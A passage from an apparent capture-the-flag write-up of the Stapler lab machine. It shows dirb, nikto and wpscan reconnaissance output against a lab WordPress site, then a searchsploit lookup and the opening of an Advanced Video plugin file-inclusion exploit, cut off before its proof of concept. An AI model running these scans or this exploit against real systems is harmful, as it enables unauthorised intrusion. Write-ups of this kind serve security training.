https://192.168.56.122:12380/phpmyadmin/templates/table/                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/<span class="built_in">test</span>/                                                    </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/                                                   </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/doc/html/ ----</span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                       </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/jquery/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/transformations/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/az/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/<span class="built_in">bg</span>/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ca/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/cs/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/da/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/de/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/el/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/es/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/et/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/<span class="keyword">fi</span>/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/fr/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/gl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/hu/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ia/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/id/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/it/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ja/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ko/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/lt/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/nl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pt/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/pt_BR/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ro/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ru/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/si/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sk/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sl/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sq/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/sv/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/tr/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/uk/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/vi/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/zh_CN/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/zh_TW/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/components/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/database/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/error/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/javascript/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/list/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/navigation/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/chart/                                             </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/table/search/                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/<span class="built_in">test</span>/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/css/                                               </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/img/                                               </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/chart/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/table/search/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/css/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/img/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/images/                                     </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/themes/original/jquery/images/ ----</span><br><span class="line">                                                                               ges/zt                                     </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Apr 13 22:15:55 2020</span><br><span class="line">DOWNLOADED: 290556 - FOUND: 10</span><br></pre></td></tr></table></figure>

<p>上nikto</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -host http://192.168.56.122:12380/</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.56.122</span><br><span class="line">+ Target Hostname:    192.168.56.122</span><br><span class="line">+ Target Port:        12380</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ SSL Info:        Subject:  /C=UK/ST=Somewhere <span class="keyword">in</span> the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</span><br><span class="line">                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">                   Issuer:   /C=UK/ST=Somewhere <span class="keyword">in</span> the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost</span><br><span class="line">+ Start Time:         2020-04-13 21:55:57 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header <span class="string">&#x27;dave&#x27;</span> found, with contents: Soemthing doesn<span class="string">&#x27;t look right here</span></span><br><span class="line"><span class="string">+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span></span><br><span class="line"><span class="string">+ The site uses SSL and Expect-CT header is not present.</span></span><br><span class="line"><span class="string">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span></span><br><span class="line"><span class="string">+ No CGI Directories found (use &#x27;</span>-C all<span class="string">&#x27; to force check all possible dirs)</span></span><br><span class="line"><span class="string">+ Entry &#x27;</span>/admin112233/<span class="string">&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span></span><br><span class="line"><span class="string">+ Entry &#x27;</span>/blogblog/<span class="string">&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span></span><br><span class="line"><span class="string">+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span></span><br><span class="line"><span class="string">+ Hostname &#x27;</span>192.168.56.122<span class="string">&#x27; does not match certificate&#x27;</span>s names: Red.Initech</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST </span><br><span class="line">+ Uncommon header <span class="string">&#x27;x-ob_mode&#x27;</span> found, with contents: 1</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin directory found</span><br><span class="line">+ 8071 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-04-13 21:58:35 (GMT-4) (158 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<p>wpscan扫一下<span class="exturl" data-url="aHR0cHM6Ly8xOTIuMTY4LjU2LjEyMjoxMjM4MC9ibG9nYmxvZy8=">https://192.168.56.122:12380/blogblog/<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --disable-tls-checks --url https://192.168.56.122:12380/blogblog/ --enumerate u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.11</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]</span></span><br><span class="line"><span class="string">[+] URL: https://192.168.56.122:12380/blogblog/ [192.168.56.122]</span></span><br><span class="line"><span class="string">[+] Started: Mon Apr 13 22:26:43 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - Dave: Soemthing doesn&#x27;</span>t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https://192.168.56.122:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] https://192.168.56.122:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://192.168.56.122:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://192.168.56.122:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://192.168.56.122:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: bhost</span><br><span class="line"> | Location: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2019-12-08T00:00:00.000Z</span><br><span class="line"> | Readme: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4.4</span><br><span class="line"> | Style URL: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: <span class="string">&#x27;Version: 1.2.9&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] John Smith</span><br><span class="line"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="line"> | Confirmed By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] barry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] john</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] elly</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] garry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] heather</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] harry</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] scott</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kathy</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tim</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Apr 13 22:26:48 2020</span><br><span class="line">[+] Requests Done: 69</span><br><span class="line">[+] Cached Requests: 6</span><br><span class="line">[+] Data Sent: 17.953 KB</span><br><span class="line">[+] Data Received: 294.119 KB</span><br><span class="line">[+] Memory used: 109.172 MB</span><br><span class="line">[+] Elapsed time: 00:00:05</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --disable-tls-checks --url https://192.168.56.122:12380/blogblog/ --enumerate p</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.11</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: https://192.168.56.122:12380/blogblog/ [192.168.56.122]</span></span><br><span class="line"><span class="string">[+] Started: Mon Apr 13 22:31:13 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - Dave: Soemthing doesn&#x27;</span>t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https://192.168.56.122:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] https://192.168.56.122:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://192.168.56.122:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://192.168.56.122:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://192.168.56.122:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: bhost</span><br><span class="line"> | Location: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2019-12-08T00:00:00.000Z</span><br><span class="line"> | Readme: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4.4</span><br><span class="line"> | Style URL: https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://192.168.56.122:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: <span class="string">&#x27;Version: 1.2.9&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Most Popular Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Apr 13 22:31:17 2020</span><br><span class="line">[+] Requests Done: 2</span><br><span class="line">[+] Cached Requests: 32</span><br><span class="line">[+] Data Sent: 616 B</span><br><span class="line">[+] Data Received: 1.095 KB</span><br><span class="line">[+] Memory used: 194.785 MB</span><br><span class="line">[+] Elapsed time: 00:00:03</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://192.168.56.122:12380/blogblog/wp-content/plugins/</span><br></pre></td></tr></table></figure>

<p>在eploitdb中搜索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit wordpress advanced video</span></span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                    |  Path</span><br><span class="line">                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Advanced Video 1.0 - Local File Inclusion                        | exploits/php/webapps/39646.py</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p>查看exploit的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/stapler-1<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/39646.py</span></span><br><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation</span></span><br><span class="line"><span class="comment"># Google Dork: N/A</span></span><br><span class="line"><span class="comment"># Date: 04/01/2016</span></span><br><span class="line"><span class="comment"># Exploit Author: evait security GmbH</span></span><br><span class="line"><span class="comment"># Vendor Homepage: arshmultani - http://dscom.it/</span></span><br><span class="line"><span class="comment"># Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/</span></span><br><span class="line"><span class="comment"># Version: 1.0</span></span><br><span class="line"><span class="comment"># Tested on: Linux Apache / Wordpress 4.2.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#       Timeline</span></span><br><span class="line"><span class="comment">#       03/24/2016 - Bug discovered</span></span><br><span class="line"><span class="comment">#       03/24/2016 - Initial notification of vendor</span></span><br><span class="line"><span class="comment">#       04/01/2016 - No answer from vendor, public release of bug </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vulnerable Code (/inc/classes/class.avePost.php) Line 57:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  function ave_publishPost()&#123;</span></span><br><span class="line"><span class="comment">#    $title = $_REQUEST[&#x27;title&#x27;];</span></span><br><span class="line"><span class="comment">#    $term = $_REQUEST[&#x27;term&#x27;];</span></span><br><span class="line"><span class="comment">#    $thumb = $_REQUEST[&#x27;thumb&#x27;];</span></span><br><span class="line"><span class="comment"># &lt;snip&gt;</span></span><br><span class="line"><span class="comment"># Line 78:</span></span><br><span class="line"><span class="comment">#    $image_data = file_get_contents($thumb);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># POC - 